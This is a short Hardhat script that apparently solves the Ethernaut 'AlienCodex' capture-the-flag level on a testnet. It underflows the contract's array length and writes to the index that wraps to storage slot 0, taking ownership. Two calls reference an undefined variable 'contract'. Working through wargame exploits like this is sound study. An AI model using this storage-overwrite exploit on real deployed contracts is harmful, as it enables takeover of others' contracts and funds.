import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Instance address
    let address_a = "0xEEf78dbe7002B6829224B1a6b0930030fCA51c7f";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("AlienCodex", address_a, signer);

    // make contact first to bypass modifer 
    await contract.make_contact();
    // underflow size of codex, to get max size, so that we have access to every memory slot and hence able to change the storage slot 0
    await contract.retract();
    // solidity keccak256 implementation is non standard
    let encrypt = ethers.utils.solidityKeccak256(["bytes32"],[ethers.utils.hexZeroPad("0x01",32)]);
    let one = ethers.BigNumber.from(encrypt);
    let mx = ethers.constants.MaxUint256;
    // overflow at 0xff..fff to reach slot 0
    let slot0 = mx.sub(one).add(1);
    console.log(slot0);

    // modify storage slot 0 of contract with player address
    await contract_a.revise(slot0, ethers.utils.hexZeroPad(player,32));
    

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
